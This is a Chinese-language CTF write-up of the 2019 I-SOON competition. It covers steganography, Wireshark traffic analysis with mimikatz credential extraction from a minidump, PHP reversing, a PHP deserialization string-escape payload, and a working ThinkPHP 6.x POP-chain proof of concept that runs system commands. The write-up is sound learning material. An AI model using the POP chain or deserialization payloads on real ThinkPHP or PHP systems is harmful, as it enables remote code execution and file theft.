# I-SOON 2019 Log

## 0x00 前言

一场十分艰难的比赛。。。。

web pwn无头绪

时间全花在misc上了

还实力眼瞎了好几次。。。。。

最后只拿到了rank 40......

道阻且长

收货

- wireshark 流量分析的进阶过滤操作

- mimikatz64工具的使用

Todo

- php curl 操作
- request 写exp....
- ....一堆要补的web知识

## 0x01 吹着贝斯扫二维码

看文件头是一堆jpg，发现要拼图。。。。。

根据四个定位定位标识的加一些边框把二维码拼出来拿到解密方法

```
BASE Family Bucket ??? 85->64->85->13->16->32
```

把zip文件的注释按照得到的解密方法解一遍就完事了

## 0x02 music

根据提示信息拿mp3stego用密钥接触压缩包密码

```
密码是123qwe123
```

然后用silenteye对压缩包里的wav进行分析，是个音频的LSB隐写

## 0x03 Attack

流量分析， tcp.stream eq 824拿到一个zip包里面有flag.txt

提示Administrator的密码

tcp.stream eq 833拿到dmp

file一下是个minidump

mimikatz64 可以对其进行分析得到所有用户的密码

用Adminstrator的密码解密

## 0x04 funny-php

逆向题

```php
function encode($str){

	$str1=array();
	$str1=unpack("C*",$str);
	for($_0=0;$_0<count($str1);$_0++){
		$_c=$str1[$_0];
		$_=$_.$_c;
	}

	$_d=array();
	for($_1=0;$_1<strlen($_);$_1++){
		$_d[$_1]=substr($_,$_1,1);		
		$_e=ord($_d[$_1])+$_1;
		$_f=chr($_e);
		$__=$__.$_f;
		if($__%100==0)
			$__=base64_encode($__);
	}
	$__=strrev(str_rot13(base64_encode($__)));

	return $__;
	
}
```
比赛的时候只写了个部分解密的脚本
```
function decode($chiper){
    
    $_ftmp='';
	$_='';
	$str='';
    $_d=array();
	$__=base64_decode(str_rot13(strrev($chiper)));
	
	print($__.'<br/>');
    for($i=0;$i<strlen($__);$i++){
		$_f=substr($__,$i,1);		
		$_e=ord($_f)-$i;
		$_=$_.chr($_e);
    }
	print($_);
	/*while(strlen($__)>0){
        if(base64_decode($__)%100==0&&base64_decode($__)!=NULL){
            $__=base64_decode($__);
		}
        $_ftmp=substr($__,strlen($__)-1,1).$_ftmp;
     	$__=substr($__,0,strlen($__)-1);
    }
	
	//$_ftmp=$__;
    print($_ftmp.'<br/>');
	for($i=0;$i<strlen($_ftmp);$i++){
		$_f=substr($_ftmp,$i,1);
		$_e=ord($_f);
		$_d[$i]=chr($_e-$i);
		$_=$_.$_d[$i];
    }
	print($_.'<br/>');
	$str1=array();
	
	$str1=explode(';',$_);
	
	$str=pack("C*",$str1);
	return $str;*/
}
```
在
```
	for($_0=0;$_0<count($str1);$_0++){
		$_c=$str1[$_0];
		$_=$_.$_c;
	}
```
之前得到这么一串数字

```
10210897103123101971151219510111099111100101125
```
根据ascii码的特征分割一下

```c
#include<stdio.h>
char str[]={102,108,97,103,123,101,97,115,121,95,101,110,99,111,100,101,125,0};
int main(){
	printf(str);
	return 0;
}
```

## 0x05 easy_serialize_php (赛后复现)

给了源码

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

看来是要利用``$serialize_info``来搞file_get_contents,

``extract($_POST);`` 可以用来覆写``$_SESSION``，但是``$_SESSION['img']``没法搞，怎么办

还是利用php反序列化长度变化尾部字符串逃逸搞,经过filter后``flag->''``就可以读到后面的东西了

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'a"';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialize_info = filter(serialize($_SESSION));


echo $serialize_info;
//a:3:{s:4:"user";s:5:"guest";s:8:"function";s:2:"a"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}

?>
```

我们要覆盖的长度为

``len('";s:8:"function";s:2:"a"')``

填充6个flag即可

问题是读什么呢？

根据提示看一下phpinfo();

可以看到auto_append_file:d0g3_f1ag.php

读一下试试

构造payload

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
/*
$_SESSION["user"] = 'guest';
$_SESSION['function'] = "show_image";
$_SESSION['img'] = base64_encode('guest_img.png');
*/

$_SESSION["user"] = 'flagflagflagflagflagflag';
$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"b";}';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialize_info = filter(serialize($_SESSION));

//echo $serialize_info;
$userinfo = unserialize($serialize_info);
echo base64_decode($userinfo['img']);

//origin a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//dest: s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
//padding s:1:"a";s:1:"b";

?>
```

返回了flag地址，再读一次就可

## I am thinking(赛后复现)

其实就是个parse_url的绕过+tp6.0POP

TP6.x POP Poc
```
<?php
namespace think\model\concern;
trait Conversion
{
}

trait Attribute
{
    private $data;
    private $withAttr = ["eki" => "system"];

    public function get()
    {
        $this->data = ["eki" => "cat /flag"];  //你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可
    }
}

namespace think;
abstract class Model{
    use model\concern\Attribute;
    use model\concern\Conversion;
    private $lazySave = false;
    protected $withEvent = false;
    private $exists = true;
    private $force = true;
    protected $field = [];
    protected $schema = [];
    protected $connection='mysql';
    protected $name;
    protected $suffix = '';
    function __construct(){
        $this->get();
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->field = [];
        $this->schema = [];
        $this->connection = 'mysql';
    }

}

namespace think\model;

use think\Model;

class Pivot extends Model
{
    function __construct($obj='')
    {
        parent::__construct();
        $this->name = $obj;
    }
}
$a = new Pivot();
$b = new Pivot($a);

echo urlencode(serialize($b));
```


parse_url用``///``绕过
### 参考资料

https://www.anquanke.com/post/id/187393